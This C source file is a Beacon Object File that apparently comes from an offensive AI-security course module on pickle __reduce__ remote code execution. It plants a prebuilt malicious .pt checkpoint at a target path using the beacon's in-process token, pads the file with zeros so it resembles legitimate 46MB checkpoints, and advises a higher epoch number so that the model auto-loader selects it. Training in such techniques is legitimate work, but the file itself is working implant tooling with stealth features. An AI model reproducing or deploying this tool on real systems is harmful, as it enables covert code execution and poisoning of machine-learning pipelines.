/*
 * picklePlant.c — write a prebuilt pickle/.pt payload to a target path (OSAI T3).
 * Course: M8.1 — __reduce__ RCE checkpoint; auto-loader picks highest-epoch .pt.
 *   Payload is generated on Kali with torch (needs torch, NOT on beacon). This BOF
 *   just performs the stealthy in-process file write of that prebuilt blob via the
 *   beacon's own token (no scp/copy/Set-Content child).  ATLAS AML.T0010.005.
 *
 * args: str targetPath, (binary blob via bof_pack "data"), int padTo(0=no pad)
 *   In .axs: pack the file bytes with ax.bof_pack("data", [bytes]) or base64->bytes.
 */
#include "aibof.h"

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* path = BeaconDataExtract(&p, NULL);
  int blobSize = 0;
  char* blob = BeaconDataExtract(&p, &blobSize);
  int padTo = BeaconDataInt(&p);
  if (!path || !*path || !blob || blobSize <= 0) {
    BeaconPrintf(CALLBACK_ERROR, "usage: picklePlant <path> <blob> [padTo]\n");
    return;
  }
  HANDLE h = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (h == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "write %s failed %lu\n", path, KERNEL32$GetLastError());
    return;
  }
  DWORD wrote = 0;
  KERNEL32$WriteFile(h, blob, blobSize, &wrote, NULL);
  /* optional size-padding: append zeros so a 1.5KB payload isn't obviously tiny
   * next to 46MB legit checkpoints (M8.1 report-note: "pad/embed"). */
  if (padTo > blobSize) {
    int pad = padTo - blobSize;
    char* zeros = (char*)intAlloc(pad > 4096 ? 4096 : pad);
    if (zeros) {
      int left = pad;
      while (left > 0) {
        int n = left > 4096 ? 4096 : left;
        DWORD w2 = 0; KERNEL32$WriteFile(h, zeros, n, &w2, NULL); left -= n;
      }
      intFree(zeros);
    }
  }
  KERNEL32$CloseHandle(h);
  unsigned int crc = crc32((unsigned char*)blob, blobSize);
  BeaconPrintf(CALLBACK_OUTPUT, "[+] picklePlant wrote %s (%d payload bytes, padded to %d) crc32=%08x\n",
               path, blobSize, padTo > blobSize ? padTo : blobSize, crc);
  BeaconPrintf(CALLBACK_OUTPUT, "[!] ensure filename uses a higher epoch than legit (resnet18_epoch_099.pt). Record for cleanup.\n");
}